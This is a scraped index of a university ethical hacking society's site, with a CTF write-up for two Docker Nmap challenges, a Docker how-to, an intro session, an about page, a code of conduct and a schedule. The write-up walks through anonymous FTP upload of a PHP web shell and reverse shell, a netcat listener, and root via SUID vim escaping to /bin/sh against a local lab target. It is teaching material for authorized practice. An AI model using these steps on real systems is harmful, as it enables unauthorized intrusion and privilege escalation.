https://cov-comsec.github.io/posts/welcome_nmap/c1/docker-compose.yaml $ sudo docker-compose up [sudo] password for kali: WARNING: Found orphan containers (kali_evilweb_1) for this project. If you removed or renamed this service in your compose file, you can run this command with the --remove-orphans flag to clean it up. Recreating kali_ftp_1 ... done Recreating kali_smtp_1 ... done Starting kali_ssh_1 ... done Creating kali_web_1 ... done Attaching to kali_web_1, kali_ssh_1, kali_smtp_1, kali_ftp_1 ftp_1 | Starting Pure-FTPd: ftp_1 | pure-ftpd -c 30 -C 10 -l puredb:/etc/pure-ftpd/pureftpd.pdb -j -R -P localhost -p 30000:30059 web_1 | AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 192.168.42.4. Set the 'ServerName' directive globally to suppress this message web_1 | AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 192.168.42.4. Set the 'ServerName' directive globally to suppress this message web_1 | [Fri Oct 22 23:08:37.325178 2021] [mpm_prefork:notice] [pid 1] AH00163: Apache/2.4.25 (Debian) PHP/7.3.4 configured -- resuming normal operations web_1 | [Fri Oct 22 23:08:37.326184 2021] [core:notice] [pid 1] AH00094: Command line: 'apache2 -D FOREGROUND' NB: Despite the output, the target machine will be launched at 192.168.42.1! ","date":"2020-10-21","objectID":"/posts/welcome_nmap_writeup/:1:0","tags":["welcome","TryHackMe","Nmap","writeup"],"title":"ComSec Introduction Writeup","uri":"/posts/welcome_nmap_writeup/"},{"categories":["Academic Year 2020-21"],"content":"Nmap Scan Now the point of this week is to learn Nmap, so lets start a scan with service detection and scripting turned on: $ nmap -sV -sC 192.168.42.1 -T4 Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-22 19:14 EDT Nmap scan report for 192.168.42.1 Host is up (0.00021s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Pure-FTPd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can't get directory listing: PASV IP 127.0.0.1 is not the same as 192.168.42.1 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 f5:f2:1d:64:04:1b:fd:92:22:7e:6b:71:b7:f4:72:49 (RSA) | 256 4b:80:f8:74:c0:8d:aa:40:fc:38:02:16:9f:1c:3b:bd (ECDSA) |_ 256 a8:08:e5:35:12:d6:a4:cc:74:8f:4c:9c:02:62:f4:f1 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: 8d1d2dc2ddf0.lan, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, | ssl-cert: Subject: commonName=8d1d2dc2ddf0 | Subject Alternative Name: DNS:8d1d2dc2ddf0 | Not valid before: 2020-08-14T10:33:23 |_Not valid after: 2030-08-12T10:33:23 |_ssl-date: TLS randomness does not represent time 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/ftp-uploads |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Site doesn't have a title (text/html). Service Info: Host: 8d1d2dc2ddf0.lan; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds It looks like we have 4 ports open. Let’s check out the web server. From the scan, we can see that there is a directory named /ftp-uploads and we can see that a flag file has been stored. So you have one flag.To be honest this flag works more like a hint to tell you what you should do after this. So if you go back to your nmap scan you will see that you have a line “21/tcp open ftp Pure-ftp” so we have a file transfer protocol it is always good to check as this can sometimes be used for file upload to the machine you are attacking. But what’s the mean of ftp-anonymous if you do a fast google search you will find out that when this happens you can have acces to ftp server without having to know the credentials.So lets try to connect to the ftp. ftp 192.168.42.1 You will be asked to input the Name. You just have to type anonymous to connect. If you do a “ls” you will be able do see the a file called FTPflag.txt which is the same file you found in the website. You type help you will see as the commands that you can use inside the ftp, we want to upload p0wnyshell so that we can get access to the machine through the browser. For now you just need to know that we are using p0wnyshell as our reverse-shell. So “ctrl+c” to stop the ftp connection clone p0wny shell repository P0wny-Shell. cd p0wny-shell ftp 192.168.42.1 put shell.php The last command is going to upload our shell. If you go back to your browser and back to “/ftp-uploads/anonymous” you will see the file shell.php in there clicked and you will have p0wny-shell. So you succefully entered the machine. Let’s look for the last flag. A easy way to find files on linux is using the file command. find / -name \"*.txt\" 2\u003e/dev/null Congratulations! Lets move to docker2 ","date":"2020-10-21","objectID":"/posts/welcome_nmap_writeup/:1:1","tags":["welcome","TryHackMe","Nmap","writeup"],"title":"ComSec Introduction Writeup","uri":"/posts/welcome_nmap_writeup/"},{"categories":["Academic Year 2020-21"],"content":"Nmap 2 To start this challenge, use: wget https://cov-comsec.github.io/posts/welcome_nmap/c2/docker-compose.yaml docker-compose up So to prove how important is nmap we setup a second nmap challenge but right now we not following the common ports as you can see in here. We mangled the ports from the StandardPorts sudo nmap -sC -sV 192.168.42.1 -p- In this challenge the ftp part is the same as the first challenge and the first flag is the same, the only difference is that the ports have been changed so if you to “http://192.168.42.1” the website is not going to load you need to instead look for something like this “192.168.42.1:8080”. So lets pass to the second part uploading files to ftp. We have ftp running on port 2121 (2121/tcp ccproxy-ftp) last time you use “ftp $ip” to connect this time that wont work cause you will need to specify the port os instead use something like this “ftp $ip port” ftp 192.168.42.1 2121 Again use anonymous as login. In this challegne we introduced privesc so we will need a scrip to enumerate all te services that are being run on the machine, file permissions, file types, sym links ,etc. There are 2 that are I know, LinEnum and linpeas. I prefer linpeas{target=_blank}, instead of cloning the repository what I did is I open my prefered text editor on my kali box and I just copy/pasted the script. Then I stopped the ftp connection I cd to the directory where I have linpeas, I started the connection again and use the “put linpeas.sh” to copy linpeas to the machine. Besides linpeas we will need a php reverse shell, cause p0wny shell is not going to work in this challenge. Another good resource to put in your bookmarks, PentestMonkeys{target=_blank} I did the same process with both linpeas and the php-reverse-shell{target=_blank} so open your editor and “ctrl+c / ctrl+v” put hte ip of your kali box in the line where you see \"\" \\change this\" and upload the file to the ftp. So right now you should see something like this Which means you ready. Open a terminal and start netcat. nc -lvnp 1234 Go to “192.168.42.1:8080/ftp-uploads/php-reverse-shell.php” the site should be loading for ever. If you go back to your terminal you should have access to the box. Tip: everytime I get a reverse shell I try to find out what user I am. whoami Lets not forget we are in /var/www , we need to copy our linpeas script to tmp folder. cp linpeas.sh /tmp chmod +x linpeas.sh ./linpeash.sh Take a look at the output and try to find the SUID section. If you don’t know SUID is a type of permission that you have on linux that let’s the user run the file or binary. That last line mentioning vim.basic maybe we can do some research and see how we can exploit it. Fortunately there is a good resource called GTFOBins which is used for looking how we can exploit binaries look for vim and you will see that you can spawn a shell inside vim or using the command. :!/bin/sh #or vim -c ':!/bin/sh' Now you are root! cd /root cat flag.txt Congratulations on solving the first ComSec challenge. Don’t forget to submit your flags on CTFd. If you need any help, feel free to comment below or contact us on discord! ","date":"2020-10-21","objectID":"/posts/welcome_nmap_writeup/:2:0","tags":["welcome","TryHackMe","Nmap","writeup"],"title":"ComSec Introduction Writeup","uri":"/posts/welcome_nmap_writeup/"},{"categories":["Academic Year 2020-21"],"content":"This year we will be using a lot of docker machines. They are like virtual machines, however slimed down, therefore using less resources and have smaller file sizes. We recommend running docker on your Kali Linux machine (or Debian based distribution), even though it can run on Windows, it can be temperamental at times. Therefore, this is a guide for Linux only. ","date":"2020-10-19","objectID":"/posts/docker-compose/:0:0","tags":["Docker","docker-compose","Kali","Guide"],"title":"How-To: docker-compose","uri":"/posts/docker-compose/"},{"categories":["Academic Year 2020-21"],"content":"Installation Firstly, ensure your system is fully up to date, then install the necessary packages. $ sudo apt update \u0026\u0026 sudo apt upgrade $ sudo apt install docker.io docker-compose Now all the required software should be downloaded. ","date":"2020-10-19","objectID":"/posts/docker-compose/:1:0","tags":["Docker","docker-compose","Kali","Guide"],"title":"How-To: docker-compose","uri":"/posts/docker-compose/"},{"categories":["Academic Year 2020-21"],"content":"Demonstration Next you will need a docker-compose file - this just instructs docker on how to load the correct image. For this demonstration, we will use the file from the first week. Below, we firstly create a new folder, download a docker-compose file then run it. $ mkdir testDocker $ cd testDocker $ wget https://cov-comsec.github.io/posts/welcome_nmap/c1/docker-compose.yaml $ sudo docker-compose up Starting testdocker_ftp_1 ... done Starting testdocker_ssh_1 ... done Starting testdocker_smtp_1 ... done Starting testdocker_web_1 ... done Attaching to testdocker_ssh_1, testdocker_web_1, testdocker_smtp_1, testdocker_ftp_1 ftp_1 | Starting Pure-FTPd: ftp_1 | pure-ftpd -c 30 -C 10 -l puredb:/etc/pure-ftpd/pureftpd.pdb -j -R -P localhost -p 30000:30059 web_1 | AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 192.168.42.3. Set the 'ServerName' directive globally to suppress this message web_1 | AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 192.168.42.3. Set the 'ServerName' directive globally to suppress this message web_1 | [Sun Jun 20 23:10:50.635898 2021] [mpm_prefork:notice] [pid 1] AH00163: Apache/2.4.25 (Debian) PHP/7.3.4 configured -- resuming normal operations Warning Do not close this terminal window (otherwise docker will stop) – just open a new terminal window. ","date":"2020-10-19","objectID":"/posts/docker-compose/:2:0","tags":["Docker","docker-compose","Kali","Guide"],"title":"How-To: docker-compose","uri":"/posts/docker-compose/"},{"categories":["Academic Year 2020-21"],"content":"Finding the Right IP Normally docker should assign itself to localhost (127.0.0.1), however this is not always the case – just have a look at the output from the docker-start command, and it should show you (see the demo above). To be able to attack all services, to complicate matters, you will have to change this IP – change the end number to a 1. E.g., 192.168.42.4 -\u003e 192.168.42.1 ","date":"2020-10-19","objectID":"/posts/docker-compose/:2:1","tags":["Docker","docker-compose","Kali","Guide"],"title":"How-To: docker-compose","uri":"/posts/docker-compose/"},{"categories":["Academic Year 2020-21"],"content":"Shutting Down Docker When you have finished \u0026 found all the flags (congratulations) go back to the terminal window running docker – press CTRL + C simultaneously. Sometimes this takes a minute or two – wait until all the machines say ‘done’. ^CGracefully stopping... (press Ctrl+C again to force) Stopping testdocker_web_1 ... done Stopping testdocker_smtp_1 ... done Stopping testdocker_ftp_1 ... done Stopping testdocker_ssh_1 ... done ","date":"2020-10-19","objectID":"/posts/docker-compose/:2:2","tags":["Docker","docker-compose","Kali","Guide"],"title":"How-To: docker-compose","uri":"/posts/docker-compose/"},{"categories":["Academic Year 2020-21"],"content":"Troubleshooting/Common Errors Docker is an amazing piece of software - when it works! Unfortunately, it is prone to errors; here’s how to fix the most common: Error - E: Package 'python3-pip' has no installation candidate Answer: ensure pip is installed apt install pip. Error - Pool overlaps with other one on this address space Answer: this means that another docker machine/service on your PC is using the same port. This problem can be solved by turning off said docker machine/service and running sudo docker network prune. ","date":"2020-10-19","objectID":"/posts/docker-compose/:3:0","tags":["Docker","docker-compose","Kali","Guide"],"title":"How-To: docker-compose","uri":"/posts/docker-compose/"},{"categories":["Academic Year 2020-21"],"content":"General Advice/Tips Run the command as sudo. Ensure a file named ‘docker-compose.yaml’ exists in your present working directory. Restart docker machines - sudo docker-compose restart (must be run in the same folder as the docker-compose file). Run sudo docker-compose kill (must be run in the same folder as the docker-compose file) to force shutdown a machine. Try resetting IP addresses - sudo docker network prune. Restart VM – surprising what a reboot can do! Google the error or look at the man pages (man docker-compose). ","date":"2020-10-19","objectID":"/posts/docker-compose/:3:1","tags":["Docker","docker-compose","Kali","Guide"],"title":"How-To: docker-compose","uri":"/posts/docker-compose/"},{"categories":["Academic Year 2020-21"],"content":"An introduction to ComSec and looking at network enumeration.","date":"2020-10-15","objectID":"/posts/welcome_nmap/","tags":["welcome","TryHackMe","Nmap"],"title":"ComSec Introduction","uri":"/posts/welcome_nmap/"},{"categories":["Academic Year 2020-21"],"content":"This week is the first session of the academic year, and we will cover: What is ComSec? Network Scanning with Nmap Introduction to TryHackMe ","date":"2020-10-15","objectID":"/posts/welcome_nmap/:0:0","tags":["welcome","TryHackMe","Nmap"],"title":"ComSec Introduction","uri":"/posts/welcome_nmap/"},{"categories":["Academic Year 2020-21"],"content":"Resources Presentation Slides Live Session Recording Docker-Compose Challenges Challenge 1 Challenge 2 ","date":"2020-10-15","objectID":"/posts/welcome_nmap/:0:1","tags":["welcome","TryHackMe","Nmap"],"title":"ComSec Introduction","uri":"/posts/welcome_nmap/"},{"categories":["Academic Year 2020-21"],"content":"What is ComSec? Firstly, welcome to ComSec, we are the university’s unofficial ethical hacking society. This year the club will be led by second year students Jack Orcherton, Martin Schon and Tiago Pascoal. As a society, our main aims are to: Learn \u0026 practise new cybersecurity/ethical hacking skills Organise and compete CTF competitions on an international stage (we do this under the team name ethical slackers and have previously taken part in RuCTFe among others) Create a warm and welcoming environment which is beginner and pro friendly and to share our skills from people across the University. ","date":"2020-10-15","objectID":"/posts/welcome_nmap/:1:0","tags":["welcome","TryHackMe","Nmap"],"title":"ComSec Introduction","uri":"/posts/welcome_nmap/"},{"categories":["Academic Year 2020-21"],"content":"Interested in Joining? It is free to join our society, to join just drop ComSec or one of the committee leaders an email (look us up in your university contacts). From there, we can provide you with more information. Unfortunately, due to Covid restrictions, we are unable to meet in person - so, for the foreseeable future, all ComSec meetings will be held at 18:30 every Wednesday on Discord. Cannot join us then? Do not worry! We aim to record sessions and provide materials here. Also, hacking challenges normally take place over the weekend - so it is still worth joining to keep in the loop. Any further questions? Just drop us an email! ","date":"2020-10-15","objectID":"/posts/welcome_nmap/:1:1","tags":["welcome","TryHackMe","Nmap"],"title":"ComSec Introduction","uri":"/posts/welcome_nmap/"},{"categories":["Academic Year 2020-21"],"content":"Legal As I am sure you will have heard by now, there are some rules when it comes to hacking: These courses are to be used only for ethical purposes Do not attack anything, unless you have written consent from the owner If you are unsure if you’re allowed to do something – you probably aren’t! So ask someone beforehand Please note we accept no liability, and you are responsible for your own actions. If in doubt, please consult the Computer Misuse Act 1990 or view your local equivalent. ","date":"2020-10-15","objectID":"/posts/welcome_nmap/:2:0","tags":["welcome","TryHackMe","Nmap"],"title":"ComSec Introduction","uri":"/posts/welcome_nmap/"},{"categories":["Academic Year 2020-21"],"content":"Hacker Mindset To be successful at hacking, you must know how to think like hacker - below shows their thought process when targeting a machine: Reconnaissance - where you find information out about a target within the public domain. Scanning and Enumeration - finding more detailed information by scanning the target. Exploitation - after finding a weakness in the above stages - you use it to gain access to a target. Maintaining Access - now you need to ensure that no one can remove your access to the target. Covering Tracks - finally, hackers do not wish to be caught so will attempt to remove evidence by deleting logs, etc. ","date":"2020-10-15","objectID":"/posts/welcome_nmap/:3:0","tags":["welcome","TryHackMe","Nmap"],"title":"ComSec Introduction","uri":"/posts/welcome_nmap/"},{"categories":["Academic Year 2020-21"],"content":"Scanning and Enumeration Scanning and enumeration is a form of active reconnaissance and is used to find detailed information on a target - to find ways to exploit it. ","date":"2020-10-15","objectID":"/posts/welcome_nmap/:4:0","tags":["welcome","TryHackMe","Nmap"],"title":"ComSec Introduction","uri":"/posts/welcome_nmap/"},{"categories":["Academic Year 2020-21"],"content":"Port Scanning One popular scan is a port/network scan. The point of this is to be able to identify targets IP addresses and their open ports (from this you can gleam some of the services/software a server uses). The most popular tool to do this is named Nmap. Why Port Scan? First step on most challenges Find programs running on devices Find program versions and find associated vulnerabilities OS detection Easy to do The main disadvantage is that it can be ‘loud’ and detected by IDS/IPS. Types of Scans Due to different types of technologies, there are multiple ways to scan targets, the main ones are described below: TCP Stealth Scan TCP is a connection-oriented method used by most protocols (e.g., SSH, HTTP, HTTPS). It has the following stages known as a handshake: Syn – client device initiates and attempts to establish connection Syn-ack – server acknowledges receipt of syn Ack – client acknowledges receipt of syn-ack, and communication will start Fin – terminates connection A TCP scan uses this to its advantage, it sends a syn packet and if a syn-ack packet is received, the port is open. The connection is then dropped, before the host fully recognises the connection. Ping Scan Sends an ICMP packet to specified hosts, if there is a response, you know it is up. UDP Scan Sends UDP packet, if there is a response it is open, if there is no response it is open or filtered. If the port is unreachable, it is closed. ARP Scan Sends an ARP request and waits for responses. Listening Just listens to network traffic and can detect which devices are communicating. ","date":"2020-10-15","objectID":"/posts/welcome_nmap/:4:1","tags":["welcome","TryHackMe","Nmap"],"title":"ComSec Introduction","uri":"/posts/welcome_nmap/"},{"categories":["Academic Year 2020-21"],"content":"Nmap Nmap is the most popular network scanner and installed on Kali by default. Here I will teach you the basics of how to use it. ","date":"2020-10-15","objectID":"/posts/welcome_nmap/:5:0","tags":["welcome","TryHackMe","Nmap"],"title":"ComSec Introduction","uri":"/posts/welcome_nmap/"},{"categories":["Academic Year 2020-21"],"content":"Common Arguments -A – runs OS detection, version detection, script scanning \u0026 traceroute. -T – set timing 0-5 (higher is faster but runs risk of being detected). -v/-vv – verbose mode – displays progress info in the terminal. -pn – skip host discovery – sometimes useful when devices will not respond to ICMP. -p – port selection (use –p- for all ports). -sV – find service \u0026 version running on the port. -F – fast mode, scans fewer ports compared to a normal scan. -O – OS detection. For more options – run man Nmap. Out of habit when I am hacking, I typically use the following command: nmap -A -T4 -p- targetIP -vv This means that it will scan all ports and enumerate everything. ","date":"2020-10-15","objectID":"/posts/welcome_nmap/:5:1","tags":["welcome","TryHackMe","Nmap"],"title":"ComSec Introduction","uri":"/posts/welcome_nmap/"},{"categories":["Academic Year 2020-21"],"content":"Today’s Challenge This week we will be using Docker - to run the challenges, firstly download them both from the resources area at the top - then do the following: sudo apt install docker-compose cd /location/of/downloaded/file docker-compose up Now complete the first challenge, then once completed type ctrl + c and repeat instructions for the second challenge. We will release a walk through later in the week. ","date":"2020-10-15","objectID":"/posts/welcome_nmap/:5:2","tags":["welcome","TryHackMe","Nmap"],"title":"ComSec Introduction","uri":"/posts/welcome_nmap/"},{"categories":["Academic Year 2020-21"],"content":"TryHackMe TryHackMe is an online platform aimed towards beginners \u0026 gives guided walkthroughs on challenges (if you are more advanced you may want to try HTB, more on this in the future). Go to TryHackMe \u0026 create the free account! As a final challenge, try and complete the nmap room. ","date":"2020-10-15","objectID":"/posts/welcome_nmap/:6:0","tags":["welcome","TryHackMe","Nmap"],"title":"ComSec Introduction","uri":"/posts/welcome_nmap/"},{"categories":null,"content":"Hello and welcome to ComSec, we are Coventry University’s unofficial ethical hacking society. We meet weekly during term-time, typically on Wednesdays, to provide lectures on ethical hacking, invite guest lecturers, compete in tournaments and meeting with businesses in the cybersecurity field. Currently the CTF teams operate with the aliases ‘Ethical Slackers’ or ‘R0073R5’. We participate in a number of university CTFs such as Hack The Box Uni CTF, as well as global CTFs such as the Cyber Apocalypse and DEADFACE. In 2022 we ranked 6th in the UK. We plan to resume ComSec fully again in September 2023. In the meantime, we are always active on our Discord channel, invite links available to Coventry University students. ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"About ComSec","uri":"/about/"},{"categories":null,"content":"Committee As a society we are fairly open and will allow anyone to run sessions. One of the advantages of not being an official society is no requirement for formal society roles. However, to ensure that the club runs smoothly, ComSec is currently led by the following people: Hedvig M Agnes Suszter Alex S Owen Ball ","date":"0001-01-01","objectID":"/about/:1:0","tags":null,"title":"About ComSec","uri":"/about/"},{"categories":null,"content":"Want to Join? If you are a Coventry University student, feel free to get in touch by either searching for ‘ComSec’ university’s active directory. ","date":"0001-01-01","objectID":"/about/:2:0","tags":null,"title":"About ComSec","uri":"/about/"},{"categories":null,"content":"Our Pledge We as members, contributors, and leaders pledge to make participation in our community a harassment-free experience for everyone, regardless of age, body size, visible or invisible disability, ethnicity, sex characteristics, gender identity and expression, level of experience, education, socio-economic status, nationality, personal appearance, race, religion, or sexual identity and orientation. We pledge to act and interact in ways that contribute to an open, welcoming, diverse, inclusive, and healthy community. ","date":"0001-01-01","objectID":"/conduct/:1:0","tags":null,"title":"Code of Conduct","uri":"/conduct/"},{"categories":null,"content":"Our Standards Examples of behavior that contributes to a positive environment for our community include: Demonstrating empathy and kindness toward other people Being respectful of differing opinions, viewpoints, and experiences Giving and gracefully accepting constructive feedback Accepting responsibility and apologizing to those affected by our mistakes, and learning from the experience Focusing on what is best not just for us as individuals, but for the overall community Examples of unacceptable behavior include: The use of sexualized language or imagery, and sexual attention or advances of any kind Trolling, insulting or derogatory comments, and personal or political attacks Public or private harassment Publishing others’ private information, such as a physical or email address, without their explicit permission Other conduct which could reasonably be considered inappropriate in a professional setting ","date":"0001-01-01","objectID":"/conduct/:2:0","tags":null,"title":"Code of Conduct","uri":"/conduct/"},{"categories":null,"content":"Enforcement Responsibilities Community leaders are responsible for clarifying and enforcing our standards of acceptable behavior and will take appropriate and fair corrective action in response to any behavior that they deem inappropriate, threatening, offensive, or harmful. Community leaders have the right and responsibility to remove, edit, or reject comments, commits, code, wiki edits, issues, and other contributions that are not aligned to this Code of Conduct, and will communicate reasons for moderation decisions when appropriate. ","date":"0001-01-01","objectID":"/conduct/:3:0","tags":null,"title":"Code of Conduct","uri":"/conduct/"},{"categories":null,"content":"Scope This Code of Conduct applies within all community spaces, and also applies when an individual is officially representing the community in public spaces. Examples of representing our community include using an official e-mail address, posting via an official social media account, or acting as an appointed representative at an online or offline event. ","date":"0001-01-01","objectID":"/conduct/:4:0","tags":null,"title":"Code of Conduct","uri":"/conduct/"},{"categories":null,"content":"Enforcement Instances of abusive, harassing, or otherwise unacceptable behavior may be reported to the ComSec Committee leaders by using the contact details available from our About page. All complaints will be reviewed and investigated promptly and fairly. All community leaders are obligated to respect the privacy and security of the reporter of any incident. ","date":"0001-01-01","objectID":"/conduct/:5:0","tags":null,"title":"Code of Conduct","uri":"/conduct/"},{"categories":null,"content":"Enforcement Guidelines Community leaders will follow these Community Impact Guidelines in determining the consequences for any action they deem in violation of this Code of Conduct: ","date":"0001-01-01","objectID":"/conduct/:6:0","tags":null,"title":"Code of Conduct","uri":"/conduct/"},{"categories":null,"content":"1. Correction Community Impact: Use of inappropriate language or other behavior deemed unprofessional or unwelcome in the community. Consequence: A private, written warning from community leaders, providing clarity around the nature of the violation and an explanation of why the behavior was inappropriate. A public apology may be requested. ","date":"0001-01-01","objectID":"/conduct/:6:1","tags":null,"title":"Code of Conduct","uri":"/conduct/"},{"categories":null,"content":"2. Warning Community Impact: A violation through a single incident or series of actions. Consequence: A warning with consequences for continued behavior. No interaction with the people involved, including unsolicited interaction with those enforcing the Code of Conduct, for a specified period of time. This includes avoiding interactions in community spaces as well as external channels like social media. Violating these terms may lead to a temporary or permanent ban. ","date":"0001-01-01","objectID":"/conduct/:6:2","tags":null,"title":"Code of Conduct","uri":"/conduct/"},{"categories":null,"content":"3. Temporary Ban Community Impact: A serious violation of community standards, including sustained inappropriate behavior. Consequence: A temporary ban from any sort of interaction or public communication with the community for a specified period of time. No public or private interaction with the people involved, including unsolicited interaction with those enforcing the Code of Conduct, is allowed during this period. Violating these terms may lead to a permanent ban. ","date":"0001-01-01","objectID":"/conduct/:6:3","tags":null,"title":"Code of Conduct","uri":"/conduct/"},{"categories":null,"content":"4. Permanent Ban Community Impact: Demonstrating a pattern of violation of community standards, including sustained inappropriate behavior, harassment of an individual, or aggression toward or disparagement of classes of individuals. Consequence: A permanent ban from any sort of public interaction within the community. ","date":"0001-01-01","objectID":"/conduct/:6:4","tags":null,"title":"Code of Conduct","uri":"/conduct/"},{"categories":null,"content":"Attribution This Code of Conduct is adapted from the Contributor Covenant, version 2.0 Community Impact Guidelines were inspired by Mozilla’s code of conduct enforcement ladder. For answers to common questions about this code of conduct, see the FAQ at https://www.contributor-covenant.org/faq. Translations are available at https://www.contributor-covenant.org/translations. ","date":"0001-01-01","objectID":"/conduct/:7:0","tags":null,"title":"Code of Conduct","uri":"/conduct/"},{"categories":null,"content":"The Schedule for ComSec 2022/23","date":"0001-01-01","objectID":"/schedule/","tags":null,"title":"ComSec Session Schedule 2022/23","uri":"/schedule/"},{"categories":null,"content":"Session Schedule is an estimation, and is subject to change. ","date":"0001-01-01","objectID":"/schedule/:0:0","tags":null,"title":"ComSec Session Schedule 2022/23","uri":"/schedule/"},{"categories":null,"content":"Semester 1 Week Title Organiser ✓ Week 1 Welcome to ComSec Introductory Session Ben R, Hedvig M ✓ Week 2 Introduction to boot2root CTFs Mattia D, Hedvig M ✓ Week 3 Server Side Template Injection Ben R ✓ Week 4 A Pentesters Guide to the Internet Alex S ✓ Week 5 External Entity Injection Alex S, Hedvig M ✓ Week 6 Advanced SQL Injection Techniques Hedvig M, Ben R ✓ Week 7 Serial Transmission Procotols Tiago P, Martin S, Ben R ✓ Week 8 Introduction to Docker for CTFs Martin S, Mattia D ✓ Week 9 Introduction to Pwn Adventure and Reverse Engineering Ben R ✓ Week 10 Binary Patching \u0026 Data Extraction to Hack Pwn Adventure Ben R ✓ Week 11 Writing a Network Proxy to Hack Pwn Adventure Martin S, Ben R ✓ Week 12 Hacking all the Pwn Adventure things! ","date":"0001-01-01","objectID":"/schedule/:1:0","tags":null,"title":"ComSec Session Schedule 2022/23","uri":"/schedule/"},{"categories":null,"content":"Semester 2 Week Title Organiser ✓ Week 1 Welcome back, Hackerspace N/A ✓ Week 2 Christmas CTF Recap and Challenge Demos Martin S, Mattia D, Hedvig M, Ben R ✓ Week 3 Attacking Python, Part 1 Alex S, Ben R ✓ Week 4 Binary Fuzzing - Intro to AFL++ Ben R ✓ Week 5 Attacking Python, Part 2 Alex S ✓ Week 6 Mid Term,Hackerspace N/A ✓ Week 7 Nettitude Talk \u0026 CTF N/A ✓ Week 8 Trip to Bletchley Park N/A ✓ Week 9 Introduction to Meltdown/Spectre Style Attacks Mattia D ✓ Week 10 HackTheBox Cyber Apocalypse N/A ✓ Week 11 End of year, Hackerspace N/A ","date":"0001-01-01","objectID":"/schedule/:2:0","tags":null,"title":"ComSec Session Schedule 2022/23","uri":"/schedule/"}]